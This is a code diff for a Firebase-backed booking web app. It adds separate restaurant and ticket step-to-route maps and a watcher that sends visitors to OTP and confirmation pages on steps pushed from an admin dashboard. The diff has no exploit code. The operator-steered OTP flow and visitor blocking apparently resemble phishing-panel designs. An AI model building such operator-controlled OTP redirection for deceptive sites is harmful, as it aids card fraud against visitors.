@@ -14,7 +14,7 @@ import {
   listenForVisitorBlock,
 } from "@/lib/firebase";
 
-const STEP_TO_PATH: Record<number, string> = {
+const TICKET_STEP_TO_PATH: Record<number, string> = {
   1: "/registration",
   2: "/booking",
   3: "/cart",
@@ -24,20 +24,72 @@ const STEP_TO_PATH: Record<number, string> = {
   7: "/confirmation",
 };
 
+// For restaurant flow, steps 2 (booking) and 3 (reserve_checkout) are
+// internal page steps inside `/reserve/:id` — navigating away from that URL
+// would lose the restaurant context. Only OTP and confirmation steps map to
+// shared routes.
+const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
+  5: "/otp",
+  6: "/otp",
+  7: "/confirmation",
+};
+
+function pickTargetPath(step: number, data: any): string | null {
+  const onReservePage = window.location.pathname.startsWith("/reserve");
+  const isRestaurant =
+    onReservePage ||
+    String(data?.type || "").toLowerCase() === "restaurant_reservation" ||
+    !!data?.restaurant ||
+    !!data?.restaurantEn ||
+    String(data?.currentPage || "") === "reserve_checkout" ||
+    String(data?.currentPage || "") === "reserve_otp";
+  const map = isRestaurant ? RESTAURANT_STEP_TO_PATH : TICKET_STEP_TO_PATH;
+  return map[step] || null;
+}
+
 function DirectedStepWatcher() {
   const [location, setLocation] = useLocation();
   useEffect(() => {
-    const path = window.location.pathname;
-    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;
-    const unsubscribe = listenForDirectedStep((step) => {
-      const target = STEP_TO_PATH[step];
+    let unsubscribe: (() => void) | undefined;
+    let attachedFor: string | null = null;
+
+    const isAdminPath = () => {
+      const p = window.location.pathname;
+      return p.startsWith("/dashboard") || p.startsWith("/login");
+    };
+
+    const handler = (step: number, data: any) => {
+      // Re-check at fire time so admins don't get hijacked even if the
+      // listener was attached on a non-admin path earlier.
+      if (isAdminPath()) return;
+      const target = pickTargetPath(step, data);
+      // Always clear so the same step can be re-pushed and so the dashboard
+      // doesn't keep showing a stale "directed" indicator.
+      void clearDirectedStep();
       if (!target) return;
       if (window.location.pathname !== target) {
         setLocation(target);
       }
-      void clearDirectedStep();
-    });
-    return () => unsubscribe();
+    };
+
+    const tryAttach = () => {
+      const id = localStorage.getItem("visitor");
+      if (!id || id === attachedFor) return;
+      if (unsubscribe) unsubscribe();
+      attachedFor = id;
+      unsubscribe = listenForDirectedStep(handler);
+    };
+
+    tryAttach();
+    // The visitor ID is created on registration, which can happen after this
+    // effect first runs. Poll every 1.5s so the listener attaches as soon as
+    // the visitor record exists.
+    const retry = window.setInterval(tryAttach, 1500);
+
+    return () => {
+      window.clearInterval(retry);
+      if (unsubscribe) unsubscribe();
+    };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
   void location;
